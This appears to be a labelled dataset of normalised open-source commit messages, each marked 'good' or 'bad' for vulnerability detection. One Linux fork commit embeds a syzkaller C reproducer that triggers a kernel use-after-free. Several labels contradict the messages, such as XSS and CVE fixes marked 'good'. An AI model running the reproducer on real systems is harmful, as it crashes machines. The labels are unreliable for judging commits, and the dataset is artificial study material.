"";"index";"all_text";"vuln"
"1783";"11984";"x86_64 trap fix the espfix64 df fixup and rewrite it in c there s nothing special enough about the espfix64 double fault fixup to justify writing it in assembly move it to c this also fix a bug if the double fault came from an ist stack the old asm code would return to a partially uninitialized stack frame fix 3891a04aafd668686239349ea58f3314ea2af86b signed off by andy lutomirski luto amacapital net reviewed by thomas gleixner tglx linutronix de cc stable vger kernel org signed off by linus torvalds torvalds linux foundation org";"good"
"1784";"10513";"fix problem in type and customer code substitution in numbering module";"good"
"1785";"1433";"ipv6 fix slab corruption running ip6sic from eric sesterhenn snakebyte gmx de signed off by andrew morton akpm linux foundation org signed off by david s miller davem davemloft net";"bad"
"1786";"4737";"alsa msnd optimize harden dsp and midi loop the isa msnd driver have loop fetching the ring buffer head tail and size value inside the loop such code are inefficient and fragile this patch optimizes it and also add the sanity check to avoid the endless loop bugzilla http bugzilla kernel org show_bug cgi id 196131 bugzilla http bugzilla kernel org show_bug cgi id 196133 signed off by takashi iwai tiwai suse de";"bad"
"1787";"8293";"refactor api post request";"good"
"1788";"1903";"avcodec mpeg4videoenc use 64 bit for time in mpeg4_encode_gop_header fix truncation fix assertion n 31 value 1u n failed at libavcodec put_bits h 169 fix ffmpeg_crash_2 avi found by thuan pham thuanpv comp nu edu sg marcel böhme andrew santosa and alexandru razvancaciulescu with aflsmart signed off by michael niedermayer michael niedermayer cc";"bad"
"1789";"11696";"avoid code duplication signed off by michal čihař michal cihar com";"good"
"1790";"5578";"demux mp4 fix buffer overflow in parsing of string box we ensure that pbox i_size is never smaller than 8 to avoid an integer underflow in the third argument of the subsequent call to memcpy we also make sure no truncation occurs when passing value derived from the 64 bit integer p_box i_size to argument of malloc and memcpy that may be 32 bit integer on 32 bit platform signed off by jean baptiste kempf jb videolan org";"bad"
"1791";"2355";"rds null pointer dereference in rds_atomic_free_op set rm atomic op_active to 0 when rds_pin_pages fails or the user supplied address is invalid this prevents a null pointer usage in rds_atomic_free_op signed off by mohamed ghannam simo ghannam gmail com acked by santosh shilimkar santosh shilimkar oracle com signed off by david s miller davem davemloft net";"bad"
"1792";"168";"validate container size against total message size summary for performance reason we preallocate golang container with the size given in the field header this allowed an attacker to trigger very large memory allocation and potentially crash the server with small message before creating the golang container confirm that the message is theoretically large enough to contain a list map set of the given size this requires that the binary and compact protocol use transport that can expose the amount of data waiting to be read a a result of this change you will not be able to do thing like use the raw socket transport or talk to endpoint over the http transport that don t send a content length header fix cve 2019 11939 differential revision d19595758 fbshipit source id 48bb9dbaf0467cea7a54602f0b07b00a8755c3f9";"bad"
"1793";"3271";"fixed another integer overflow problem";"bad"
"1794";"5128";"accidental mi feature yet another admin shell hole blocked this is a pretty big hole really only the fact that eli called it an accidental feature helped catch it note on the code an explicit list of path maybe just conf keydir and local would have been easier but this isn t too bad i think";"bad"
"1795";"8872";"fix leash adddisplayitem declaration commit a9cbbf0899f270fbb14f63ffbed1b6d542333641 changed three parameter in adddisplayitem from long to time_t but did not change the corresponding declaration in leashview h fix that now ticket 8640 tag pullup target_version 1 16 next";"good"
"1796";"12306";"use html5 doctype";"good"
"1797";"11171";"fix 57 data_ensure check must be before data access";"good"
"1798";"5366";"stratum extract_sockaddr truncate overlong address rather than stack overflow thanks to mick ayzenberg mick dejavusecurity com for finding this";"bad"
"1799";"1379";"do not overwrite project_id from request params prevent project_id overwriting from osapi request parameter the patch is actually very simple nova api openstack wsgi py but need significant test adjustment nova test to pas fix bug 904072 patch from vish ishaya and mark mcloughlin cherry picked from commit c9c09bd60e7a0e0258d218a31d7878755bea1395 change id i66ea0f178ce6271ec1020e9f1a73bd4e8c83ddab";"bad"
"1800";"3520";"anonymous configuration fix base thread vulnerability fix v0 3 1";"bad"
"1801";"12592";"fix 12230 x vulnerability when deleting maliciously named category a reported by secunia sa40832 there is an x vulnerability when deleting project category that have been maliciously named the chance of attack is low due to requiring project manager access to create malicious project category in the first place thanks to john reese for debugging this issue";"good"
"1802";"4678";"fixed memory leak reported in 456";"bad"
"1803";"626";"lost password service do not expose info whether a user exists or not avoid brute force attack";"bad"
"1804";"11672";"merge branch bridge_pvid toshiaki makita say bridge fix problem around the pvid there seem to be some undesirable behavior related with pvid 1 it ha no effect assigning pvid to a port pvid cannot be applied to any frame regardless of whether we set it or not 2 fdb entry learned via frame applied pvid are registered with vid 0 rather than vid value of pvid 3 we can set 0 or 4095 a a pvid that are not allowed in ieee 802 1q this lead interoperational problem such a sending frame with vid 4095 which is not allowed in ieee 802 1q and treating frame with vid 0 a they belong to vlan 0 which is expected to be handled a they have no vid according to ieee 802 1q note 2nd and 3rd problem are potential and not exposed unless 1st problem is fixed because we cannot activate pvid due to it this is my analysis for each behavior 1 we are using vlan_tag_present bit when getting pvid and not when adding deleting pvid it can be fixed in either way using or not using vlan_tag_present but i think the latter is slightly more efficient 2 we are setting skb vlan_tci with the value of pvid but the variable vid which is used in fdb later is set to 0 at br_allowed_ingress when untagged frame arrive at a port with pvid valid i m afraid that vid should be updated to the value of pvid if pvid is valid 3 according to ieee 802 1q 2011 6 9 1 and table 9 2 we cannot use vid 0 or 4095 a a pvid it look like that there are more stuff to consider vid 0 vid 0 shall not be configured in any fdb entry and used in a tag header to indicate it is a 802 1p priority tagged frame priority tagged frame should be applied pvid from ieee 802 1q 6 9 1 in my opinion since we can filter incomming priority tagged frame by deleting pvid we don t need to filter them by vlan_bitmap in other word priority tagged frame don t have vid 0 but have no vid which is the same a untagged frame and should be filtered by unsetting pvid so not only we cannot set pvid a 0 but also we don t need to add 0 to vlan_bitmap which enables u to simply forbid to add vlan 0 vid 4095 vid 4095 shall not be transmitted in a tag header this vid value may be used to indicate a wildcard match for the vid in management operation or fdb entry from ieee 802 1q table 9 2 in current implementation we can create a static fdb entry with all existing vids by not specifying any vid when creating it i don t think this way to add wildcard like entry need to change and vid 4095 look no use and can be unacceptable to add consequently i believe what we should do for 3rd problem is below not allowing vid 0 and 4095 to be added applying pvid to priority tagged vid 0 frame note it ha been descovered that another problem related to priority tag remains if we use vlan 0 interface such a eth0 0 we cannot communicate with another end station via a linux bridge this problem exists regardless of whether this patch set is applied or not because we might receive untagged frame from another end station even if we are sending priority tagged frame this issue will be addressed by another patch set introducing an additional egress policy on which vlad yasevich is working see http marc info t 137880893800001 r 1 w 2 for detailed discussion patch set follows this mail the order of patch is not the same a described above because the way to fix 1st problem is based on the assumption that we don t use vid 0 a a pvid which is realized by fixing 3rd problem 1 4 2 4 fix 3rd problem 3 4 fix 1st problem 4 4 fix 2nd probelm v2 add description about the problem related to priority tag in cover letter revise patch comment to reference the newest spec signed off by david s miller davem davemloft net";"good"
"1805";"6554";"fixed x issue";"bad"
"1806";"6191";"add csrf protection for bug_assign";"bad"
"1807";"1899";"address dsa ecdsa side channel";"bad"
"1808";"9923";"sd bus introduce api for re enqueuing incoming message when authorizing via policykit we want to process incoming method call twice once to process and figure out that we need pk authentication and a second time after we aquired pk authentication to actually execute the operation with this new call sd_bus_enqueue_for_read we have a way to put an incoming message back into the read queue for this purpose this might have other us too for example debugging";"good"
"1809";"4153";"packet hold bind lock when rebinding to fanout hook packet socket bind operation must hold the po bind_lock this keep po running consistent with whether the socket is actually on a ptype list to receive packet fanout_add unbinds a socket and it packet_rcv tpacket_rcv call then bind the fanout object to receive through packet_rcv_fanout make it hold the po bind_lock when testing po running and rebinding else it can race with other rebind operation such a that in packet_set_ring from packet_rcv to tpacket_rcv concurrent update can result in a socket being added to a fanout group twice causing use after free kasan bug report among others reported independently by both trinity and syzkaller verified that the syzkaller reproducer pass after this patch fix dc99f600698d packet add fanout support reported by nixioaming nixiaoming huawei com signed off by willem de bruijn willemb google com signed off by david s miller davem davemloft net";"bad"
"1810";"2801";"fix x in normalization signed off by madhura jayaratne madhura cj gmail com";"bad"
"1811";"5479";"libtiff tif_ unix vms win32 c _tiffmalloc ansi c doe not require malloc to return null pointer if requested allocation size is zero assure that _tiffmalloc doe";"bad"
"1812";"1990";"for 4 9 3 cve 2018 14470 babel fix an existing length check in babel_print_v2 the non verbose branch for an update tlv compared the tlv length against 1 instead of 10 probably a typo put it right this fix a buffer over read discovered by henri salo from nixu corporation add a test using the capture file supplied by the reporter s";"bad"
"1813";"3873";"cve 2017 12893 smb cifs add a bound check in name_len after we advance the pointer by the length value in the buffer make sure it point to something in the captured data this fix a buffer over read discovered by forcepoint s security researcher otto airamo antti levomäki add a test using the capture file supplied by the reporter s";"bad"
"1814";"5807";"fix x in zoom search signed off by madhura jayaratne madhura cj gmail com";"bad"
"1815";"329";"x fix";"bad"
"1816";"1512";"invalidate user token when password is changed fix bug 996595 this commit will cause all valid token to be deleted for a user who s password is changed implemented for the sql and kv backends change id i6ad7da8957b7041983a3fc91d9ba9368667d06ac";"bad"
"1817";"3014";"release imagemagick 7 0 2 1";"bad"
"1818";"11648";"merge branch drm linus of git git kernel org pub scm linux kernel git airlied drm 2 6 drm linus of git git kernel org pub scm linux kernel git airlied drm 2 6 drm change drm set mode message a drm_debug drm fix crtc no mode printf typo drm radeon km only evict to gtt if cp is ready drm radeon km fix crash getting tv info with no bios drm radeon km rv100 reject mode 135 mhz on dvi v2 drm radeon km r6xx make irq handler le verbose drm radeon km fix up lvds handling on mac v2";"good"
"1819";"11460";"staging bcm info leak in ioctl the devinfo u32reserved array isn t initialized so it leak kernel information to user space reported by nico golde nico ngolde de reported by fabian yamaguchi fabs goesec de signed off by dan carpenter dan carpenter oracle com cc stable kernel org signed off by linus torvalds torvalds linux foundation org";"good"
"1820";"12520";"new feature column width control via question_attribute for array type question git svn id file user shitiz downloads lssvn trunk unstable 1496 b72ed6b6 b9f8 46b5 92b4 906544132732";"good"
"1821";"3213";"fixed a sanitizer failure in the bmp codec also added a debug level command line option to the imginfo command for debugging purpose";"bad"
"1822";"4034";"fix fix to certauth pain";"bad"
"1823";"11743";"add a round robin mode to okd for selecting which child process to send a req to";"good"
"1824";"1197";"convert cdata node to text node to avoid x issue cdata node will not be html escaped user shouldn t be submitting cdata node in the first place so we should convert them to text node before escaping cve 2015 7580";"bad"
"1825";"3800";"security validate empty password again";"bad"
"1826";"7471";"pkcs 7 fix null dereference with missing encryptedcontent cve 2015 1790 reviewed by rich salz rsalz openssl org";"good"
"1827";"6068";"fixed bug 241 input not checked for sql injection git svn id file user shitiz downloads lssvn trunk unstable 1497 b72ed6b6 b9f8 46b5 92b4 906544132732";"bad"
"1828";"5461";"net avoid dependency of net_get_random_once on nop patching net_get_random_once depends on the static key infrastructure to patch up the branch to the slow path during boot this wa realized by abusing the static key api and defining a new initializer to not enable the call site while still indicating that the branch point should get patched up this wa needed to have the fast path considered likely by gcc the static key initialization during boot up normally walk through all the registered key and either patch in ideal nops or enables the jump site but omitted that step on x86 if ideal nops where already placed at static_key branch point thus net_get_random_once branch not always became active this patch switch net_get_random_once to the ordinary static_key api and thus place the kernel fast path in the by gcc considered unlikely path microbenchmarks on intel and amd x86 64 showed that the unlikely path actually beat the likely path in term of cycle cost and that different nop pattern did not make much difference thus this switch should not be noticeable fix a48e42920ff38b net introduce new macro net_get_random_once reported by tuomas räsänen tuomasjjrasanen tjjr fi cc linus torvalds torvalds linux foundation org signed off by hannes frederic sowa hannes stressinduktion org signed off by david s miller davem davemloft net";"bad"
"1829";"491";"0 21 4 update add t linting allow json comment";"bad"
"1830";"1977";"sanitise cache path co authored by jerikoone jeriko one gmx u";"bad"
"1831";"4492";"exit gracefully in case of corrupted filter close issue 782";"bad"
"1832";"1624";"ensures user is member of tenant in ec2 validation it is possible that a user is no longer a member of a tenant when they attempt to use an ec2 token this check to make sure that the user still ha at least one valid role in the tenant before authenticating them this should automatically work for the s3 version a well since it is a subclass fix bug 1064914 change id ieb237bae936a7b00ce7ba4d4c59aec6c7a69ec21";"bad"
"1833";"11595";"refactor";"good"
"1834";"2502";"prevent arithmetic overflow on bound check";"bad"
"1835";"12361";"3 3 5 release";"good"
"1836";"2974";"escape database name when showing dialog signed off by michal čihař michal cihar com";"bad"
"1837";"4499";"fixed memory leak when creating nested exception in magick";"bad"
"1838";"9486";"validate input of validator we can not trust the input here so we can expect anything and deal with missing parameter or invalid value signed off by michal čihař michal cihar com";"good"
"1839";"5787";"merge pull request 277 from phpmyadmin security issue 276 fix csrf vulnerability in login form";"bad"
"1840";"7311";"merge pull request 2626 from sparkidev sp_invmod_fixes fix sp_invmod to handle more input value";"good"
"1841";"5846";"fix x in recent favorite table list feature signed off by ann j m phpmyadmin zweisteinsoft de";"bad"
"1842";"570";"http github com imagemagick imagemagick issue 1641";"bad"
"1843";"5596";"change the xsrf cookie format to be masked with a random salt this protects against the breach attack";"bad"
"1844";"11957";"kvm x86 emulator doe not decode clflush well currently all group15 instruction are decoded a clflush e g mfence xsave in addition the clflush instruction requires no prefix 66 f2 f3 would exist if prefix exists it may encode a different instruction e g clflushopt creating a group for clflush and different group for each prefix this ha been the case forever but the next patch need the cflush group in order to fix a bug introduced in 3 17 fix 41061cdb98a0bec464278b4db8e894a3121671f5 cc stable vger kernel org signed off by nadav amit namit c technion ac il signed off by paolo bonzini pbonzini redhat com";"good"
"1845";"2325";"usb gadget f_midi fixing a possible double free in f_midi it look like there is a possibility of a double free vulnerability on an error path of the f_midi_set_alt function in the f_midi driver if the path is feasible then free_ep_req get called twice req complete f_midi_complete err usb_ep_queue midi out_ep req gfp_atomic usb_gadget_giveback_request f_midi_complete callback inside f_midi_complete for various case of status free_ep_req ep req first kfree if err error midi s couldn t enqueue request d n midi out_ep name err free_ep_req midi out_ep req second kfree return err the double free possibility wa introduced with commit ad0d1a058eac usb gadget f_midi fix leak on failed to enqueue out request found by moxcafe tool signed off by tuba yavuz tuba ece ufl edu fix ad0d1a058eac usb gadget f_midi fix leak on failed to enqueue out request acked by felipe balbi felipe balbi linux intel com cc stable stable vger kernel org signed off by greg kroah hartman gregkh linuxfoundation org";"bad"
"1846";"6843";"fix markdown link in readme";"good"
"1847";"11533";"avformat mpegts check avio_tell return code before using it fix ticket2962 signed off by michael niedermayer michaelni gmx at";"good"
"1848";"2757";"tcp fix zero cwnd in tcp_cwnd_reduction patch 3759824da87b tcp prr us crb mode by default and s mode conditionally introduced a bug that cwnd may become 0 when both inflight and sndcnt are 0 cwnd inflight sndcnt this may lead to a div by zero if the connection start another cwnd reduction phase by setting tp prior_cwnd to the current cwnd 0 in tcp_init_cwnd_reduction to prevent this we skip prr operation when nothing is acked or sacked then cwnd must be positive in all case a long a ssthresh is positive 1 the proportional reduction mode inflight ssthresh 0 2 the reduction bound mode a inflight ssthresh 0 b inflight ssthresh sndcnt 0 since newly_acked_sacked 0 and inflight ssthresh therefore in all case inflight and sndcnt can not both be 0 we check invalid tp prior_cwnd to avoid potential div0 bug in reality this bug is triggered only with a sequence of le common event for example the connection is terminating an ecn triggered cwnd reduction with an inflight 0 then it receives reordered old acks or dsacks from prior transmission which acks nothing or the connection is in fast recovery stage that mark everything lost but fails to retransmit due to local issue then receives data packet from other end which acks nothing fix 3759824da87b tcp prr us crb mode by default and s mode conditionally reported by oleksandr natalenko oleksandr natalenko name signed off by yuchung cheng ycheng google com signed off by neal cardwell ncardwell google com signed off by eric dumazet edumazet google com signed off by david s miller davem davemloft net";"bad"
"1849";"5980";"fixed issue 14505 security x attack vector participant attribute dev raw unfiltered to html filtered";"bad"
"1850";"1746";"security fixed issue 13959 rce via resource file upload a authenticated user";"bad"
"1851";"11264";"bluetooth add support for foxconn hon hai 0489 e056 add support for the ar9462 chip t bus 01 lev 02 prnt 02 port 05 cnt 01 dev 4 spd 12 mxch 0 d ver 1 10 cl e0 wlcon sub 01 prot 01 mxps 64 cfgs 1 p vendor 0489 prodid e056 rev 00 01 c ifs 2 cfg 1 atr e0 mxpwr 100ma i if 0 alt 0 eps 3 cl e0 wlcon sub 01 prot 01 driver btusb i if 1 alt 0 eps 2 cl e0 wlcon sub 01 prot 01 driver btusb signed off by acelan kao acelan kao canonical com signed off by gustavo padovan gustavo padovan collabora co uk";"good"
"1852";"3369";"alsa pcm call kill_fasync in stream lock currently kill_fasync is called outside the stream lock in snd_pcm_period_elapsed this is potentially racy since the stream may get released even during the irq handler is running although snd_pcm_release_substream call snd_pcm_drop this doesn t guarantee that the irq handler finish thus the kill_fasync call outside the stream spin lock may be invoked after the substream is detached a recently reported by kasan a a quick workaround move kill_fasync call inside the stream lock the fasync is rarely used interface so this shouldn t have a big impact from the performance pov ideally we should implement some sync mechanism for the proper finish of stream and irq handler but this oneliner should suffice for most case so far reported by baozeng ding sploving1 gmail com signed off by takashi iwai tiwai suse de";"bad"
"1853";"9402";"merge pull request 702 from mmatuska bsdcat_warnings cat declare static variable and fix compiler warning";"good"
"1854";"2425";"blkcg fix double free of new_blkg in blkcg_init_queue if blkg_create fails new_blkg passed a an argument will be freed by blkg_create so there is no need to free it again signed off by hou tao houtao1 huawei com signed off by jens axboe axboe fb com";"bad"
"1855";"5996";"fixed issue 12432 reflected x in notification thanks to mrbreaker dev using throw error for invalid id";"bad"
"1856";"5396";"security fix strip lookup call out of inventory variable and clean unsafe data returned from lookup plugins cve 2014 4966 make sure var don t insert extra parameter into module args and prevent duplicate params from superseding previous params cve 2014 4967";"bad"
"1857";"4760";"use get instead of query_string";"bad"
"1858";"8929";"net enable interface alias removal via rtnl ifla_ifalias is defined a nla_string it mean that the minimal length of the attribute is 1 0 however to remove an alias the attribute length must be 0 see dev_set_alias let s define the type to nla_binary to allow 0 length string so that the alias can be removed example ip l s dummy0 alias foo ip l l dev dummy0 5 dummy0 broadcast noarp mtu 1500 qdisc noop state down mode default group default qlen 1000 link ether ae 20 30 4f a7 f3 brd ff ff ff ff ff ff alias foo before the patch ip l s dummy0 alias rtnetlink answer numerical result out of range after the patch ip l s dummy0 alias ip l l dev dummy0 5 dummy0 broadcast noarp mtu 1500 qdisc noop state down mode default group default qlen 1000 link ether ae 20 30 4f a7 f3 brd ff ff ff ff ff ff cc oliver hartkopp oliver hartkopp net cc stephen hemminger stephen networkplumber org fix 96ca4a2cc145 net remove ifalias on empty given alias reported by julien floret julien floret 6wind com signed off by nicolas dichtel nicolas dichtel 6wind com signed off by david s miller davem davemloft net";"good"
"1859";"10903";"remove unused import caught by codacy";"good"
"1860";"4504";"webui avoid clickjacking attack";"bad"
"1861";"9060";"fix the maintainer record for the cert directory fix the maintainer record for the cert directory to have the new keyrings mailing list and also to be authoritative for the sign file tool signed off by david howells dhowells redhat com acked by david woodhouse david woodhouse intel com signed off by james morris james l morris oracle com";"good"
"1862";"5549";"fixed a server crash";"bad"
"1863";"11939";"maintainer add me a x86 vdso submaintainer here go signed off by andy lutomirski luto amacapital net acked by thomas gleixner tglx linutronix de link http lkml kernel org r 1042001e502f8e0deb0edfeeac209b68378650cf 1418430292 git luto amacapital net signed off by ingo molnar mingo kernel org";"good"
"1864";"4200";"add proc scsi to masked path this is writeable and can be used to remove device container do not need to know about scsi device signed off by justin cormack justin cormack docker com";"bad"
"1865";"6120";"fix 17874 x in file uploads an attacker can upload a flash file with an image extension if such an attachment is displayed inline it becomes a vector for x attack this issue wa reported by matthias karlsson http mathiaskarlsson me a part of offensive security s bug bounty program 1 patch with contribution from victor boctor";"bad"
"1866";"1130";"check for out of bound bencoded length before advancing buffer pointer";"bad"
"1867";"3608";"ipv6 make fragment identification le predictable ipv6 fragment identification generation is way beyond what we use for ipv4 it us a single generator it not scalable and allows do attack now inetpeer is ipv6 aware we can use it to provide a more secure and scalable frag ident generator per destination instead of system wide this patch 1 defines a new secure_ipv6_id helper 2 extends inet_getid to provide 32bit result 3 extends ipv6_select_ident with a new dest parameter reported by fernando gont fernando gont com ar signed off by eric dumazet eric dumazet gmail com signed off by david s miller davem davemloft net";"bad"
"1868";"6363";"fix stored and reflected x vulnerability a described in vn jvn 18387086 tn jpcert 95011159 advisory";"bad"
"1869";"8439";"merge pull request 4519 from soloestoy zset int problem zset int problem";"good"
"1870";"565";"enable http header validation";"bad"
"1871";"5303";"fix crash in dtls1_get_record whilst in the listen state where you get two separate read performed one for the header and one for the body of the handshake record cve 2014 3571 reviewed by matt caswell matt openssl org";"bad"
"1872";"4239";"fork fix incorrect fput of exe_file causing use after free commit 7c051267931a mm fork make dup_mmap wait for mmap_sem for write killable made it possible to kill a forking task while it is waiting to acquire it mmap_sem for write in dup_mmap however it wa overlooked that this introduced an new error path before a reference is taken on the mm_struct s exe_file since the exe_file of the new mm_struct wa already set to the old exe_file by the memcpy in dup_mm it wa possible for the mmput in the error path of dup_mm to drop a reference to exe_file which wa never taken this caused the struct file to later be freed prematurely fix it by updating mm_init to null out the exe_file in the same place it clear other thing like the list of mmaps this bug wa found by syzkaller it can be reproduced using the following c program define _gnu_source include pthread h include stdlib h include sys mman h include sys syscall h include sys wait h include unistd h static void mmap_thread void _arg for mmap null 0x1000000 prot_read map_populate map_anonymous map_private 1 0 static void fork_thread void _arg usleep rand 10000 fork int main void fork fork fork for if fork 0 pthread_t t pthread_create t null mmap_thread null pthread_create t null fork_thread null usleep rand 10000 syscall __nr_exit_group 0 wait null no special kernel config option are needed it usually cause a null pointer dereference in __remove_shared_vm_struct during exit or in dup_mmap which is usually inlined into copy_process during fork both are due to a vm_area_struct s vm_file being used after it s already been freed google bug id 64772007 link http lkml kernel org r 20170823211408 31198 1 ebiggers3 gmail com fix 7c051267931a mm fork make dup_mmap wait for mmap_sem for write killable signed off by eric biggers ebiggers google com tested by mark rutland mark rutland arm com acked by michal hocko mhocko suse com cc dmitry vyukov dvyukov google com cc ingo molnar mingo kernel org cc konstantin khlebnikov koct9i gmail com cc oleg nesterov oleg redhat com cc peter zijlstra peterz infradead org cc vlastimil babka vbabka suse cz cc stable vger kernel org v4 7 signed off by andrew morton akpm linux foundation org signed off by linus torvalds torvalds linux foundation org";"bad"
"1873";"10450";"cve 2017 13050 rpki router fix a few bug the decoder didn t properly check that the pdu length stored in the pdu header is correct the only check in place wa in rpki_rtr_print and it tested whether the length is zero but that is not sufficient make all necessary length and bound check both generic and type specific in rpki_rtr_pdu_print and reduce rpki_rtr_print to a simple loop this also fix a minor bug and pdu type 0 serial notify from rfc 6810 section 5 2 is valid again in rpki_rtr_pdu_print any protocol version wa considered version 0 fix it to skip the rest of input if the pdu protocol version is unknown ibid the pdu type 10 error report from rfc 6810 section 5 10 case block didn t consider the length of error text data element mandatory put it right ibid when printing an encapsulated pdu give itself via recursion respective buffer length to make it possible to tell whether the encapsulated pdu fit do not recurse deeper than 2nd level update prior rpki router test case that now stop to decode earlier because of the stricter check this fix a buffer over read discovered by bhargava shastry sect tu berlin add a test using the capture file supplied by the reporter s";"good"
"1874";"3872";"http github com imagemagick imagemagick issue 662";"bad"
"1875";"10709";"development mode for horde 5 2 20";"good"
"1876";"8552";"merge pull request 526 from ocsinventory ng template privacy fix privacy";"good"
"1877";"3876";"cve 2017 12896 isakmp add another test this is from brian carpenter for the print isakmp bug fix";"bad"
"1878";"10684";"http github com imagemagick imagemagick issue 850";"good"
"1879";"9742";"added timeout feature to pgsql advisory lock";"good"
"1880";"10284";"merge pull request 1002 from paulgeneres pull request fixed removed repeated block of code";"good"
"1881";"9422";"split test case to avoid huge test method signed off by michal čihař michal cihar com";"good"
"1882";"3020";"issue 717 fix integer overflow when computing location of volume descriptor the multiplication here defaulted to int but calculation of file position should always use int64_t a simple cast suffices to fix this since the base location is always 32 bit for iso so multiplying by the sector size will never overflow a 64 bit integer";"bad"
"1883";"1006";"mm avoid setting up anonymous page into file mapping reading page fault handler code i ve noticed that under right circumstance kernel would map anonymous page into file mapping if the vma doesn t have vm_ops fault and the vma wasn t fully populated on mmap kernel would handle page fault to not populated pte with do_anonymous_page let s change page fault handler to use do_anonymous_page only on anonymous vma vm_ops null and make sure that the vma is not shared for file mapping without vm_ops fault or shred vma without vm_ops page fault on pte_none entry would lead to sigbus signed off by kirill a shutemov kirill shutemov linux intel com acked by oleg nesterov oleg redhat com cc andrew morton akpm linux foundation org cc willy tarreau w 1wt eu cc stable vger kernel org signed off by linus torvalds torvalds linux foundation org";"bad"
"1884";"2581";"coder path traversal is not authorized bug report provided by masaaki chida";"bad"
"1885";"1794";"fix some minor x issue reported in ticket 69";"bad"
"1886";"59";"netns provide pure entropy for net_hash_mix net_hash_mix currently us kernel address of a struct net and is used in many place that could be used to reveal this address to a patient attacker thus defeating kaslr for the typical case initial net namespace init_net is not dynamically allocated i believe the original implementation tried to avoid spending too many cycle in this function but security come first also provide entropy regardless of config_net_ns fix 0b4419162aa6 netns introduce the net_hash_mix salt for hash signed off by eric dumazet edumazet google com reported by amit klein aksecurity gmail com reported by benny pinkas benny pinkas net cc pavel emelyanov xemul openvz org signed off by david s miller davem davemloft net";"bad"
"1887";"11714";"fixed security 73 require run_scripts for heapdump";"good"
"1888";"3299";"additional perm check in webdav";"bad"
"1889";"11061";"refactored certutil updatelocalrequest the certutil updatelocalrequest ha been modified to no longer ignore exception change id i57907a54f51f65369a062dfc396741d87874660c";"good"
"1890";"2766";"usb iowarrior fix oops with malicious usb descriptor the iowarrior driver expects at least one valid endpoint if given malicious descriptor that specify 0 for the number of endpoint it will crash in the probe function ensure there is at least one endpoint on the interface before using it the full report of this issue can be found here http seclists org bugtraq 2016 mar 87 reported by ralf spenneberg ralf spenneberg net cc stable stable vger kernel org signed off by josh boyer jwboyer fedoraproject org signed off by greg kroah hartman gregkh linuxfoundation org";"bad"
"1891";"4719";"fix 7698 uaf in r_config_set when loading a dex";"bad"
"1892";"8232";"stmmac add header inclusion protection this patch add ifndef __ header _h for protecting header from double inclusion signed off by rayagond kokatanur rayagond vayavyalabs com hacked by giuseppe cavallaro peppe cavallaro st com signed off by david s miller davem davemloft net";"good"
"1893";"791";"prevent strrpos and strripos from visiting out of bound memory reviewed by alexeyt differential revision d14669668 fbshipit source id 16bb4674bccf83ffd737e60d1fd9fd4a0093f77c";"bad"
"1894";"9696";"fix memory leak found by fuzzer test case id 000051 sig 11 sync fuzzer3 src 004221";"good"
"1895";"9347";"fix 9584 user email address length can be longer than 60 a far a i know there s no need for this artificial limitation";"good"
"1896";"8919";"修改语言为合乎bcp47标准的语言显示方式 see http tool ietf org html bcp47 http www iana org assignment language subtag registry language subtag registry http www zhihu com question 20797118";"good"
"1897";"6817";"removed composer phar from repository";"good"
"1898";"4072";"fix infoleak in waitid 2 kernel_waitid can return a pid an error or 0 rusage is filled in the first case and waitid 2 rusage should ve been copied out exactly in that case not whenever kernel_waitid ha not returned an error compat variant share that braino none of kernel_wait4 caller do so the below ought to fix it reported and tested by alexander potapenko glider google com fix ce72a16fa705 wait4 2 waitid 2 separate copying rusage to userland cc stable vger kernel org v4 13 signed off by al viro viro zeniv linux org uk";"bad"
"1899";"4106";"do not expose id in form";"bad"
"1900";"12059";"test fix undefined behaviour warning";"good"
"1901";"5343";"update the 0 8 3 release note with the cf";"bad"
"1902";"3692";"bugfix escaping base url for anchor link rewritten by ssviewer process with the rewritehashlinks option enabled which is a framework default and necessary because of the use of a base tag also added escaping for base url rendered through the php variation of rewritehashlinks";"bad"
"1903";"8125";"sanitize user input";"good"
"1904";"10079";"use sub directory for file change log";"good"
"1905";"5929";"fixed some x issue";"bad"
"1906";"9513";"fix bug 72407 null pointer dereference at _gdscalevert";"good"
"1907";"10894";"coredump ensure proper size of sparse core file if the last section of a core file end with an unmapped or zero page the size of the file doe not correspond with the last dump_skip call gdb complains that the file is truncated and can be confusing to user after all of the vma section are written make sure that the file size is no smaller than the current file position this problem can be demonstrated with gdb s bigcore testcase on the sparc architecture signed off by dave kleikamp dave kleikamp oracle com cc alexander viro viro zeniv linux org uk cc linux fsdevel vger kernel org cc linux kernel vger kernel org signed off by al viro viro zeniv linux org uk";"good"
"1908";"3509";"sanitize lat lon for sql query";"bad"
"1909";"1648";"encode the uri properly";"bad"
